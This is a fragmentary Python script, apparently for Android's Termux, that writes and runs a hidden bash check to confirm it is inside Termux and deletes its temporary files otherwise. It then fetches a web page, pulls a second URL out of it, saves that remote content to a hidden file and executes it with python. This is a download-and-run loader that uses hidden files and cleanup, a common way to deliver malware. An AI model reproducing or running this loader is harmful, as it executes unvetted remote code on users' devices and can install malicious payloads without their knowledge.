...
x=$(grep -o "com.termux" <<< "$(pwd)" > .__xnuxer_xd__)
''')
try:
	open(".__xnuxer_ganz__","w").write(sxp_termux)
except:
	__import__("os").system("rm .__xnuxer_ganz__ &> /dev/null")
	__import__("sys").exit()

try:
	__import__("os").system("bash .__xnuxer_ganz__")
except:
	__import__("os").system("rm .__xnuxer_ganz__ .__xnuxer_xd__ &> /dev/null")
	__import__("sys").exit()
try:
	yo = open(".__xnuxer_xd__","r").read().split()[0]
	if yo == "com.termux":
		__import__("os").system("rm .__xnuxer_ganz__ .__xnuxer_xd__ &> /dev/null")
		pass
	else:
...
file_a = ".__xnuxer__"
file_b = ".__xnuxer_xd__"
file_c = ".__xnuxer_ganz__"
...
try:
	...
	xnuxer = requests.get(sxp,headers={"user-agent":agent}).text
	index = xnuxer.split("Url: ")[1].split("\r\n")
	url = index[0]
	__xnuxer__ = requests.get(url,headers={"user-agent":agent}).text
	__free_tutorial__ = open(".__xnuxer__","w").write(__xnuxer__)
	### gaskeun masbro ###
	os.system("python .__xnuxer__")
	"""
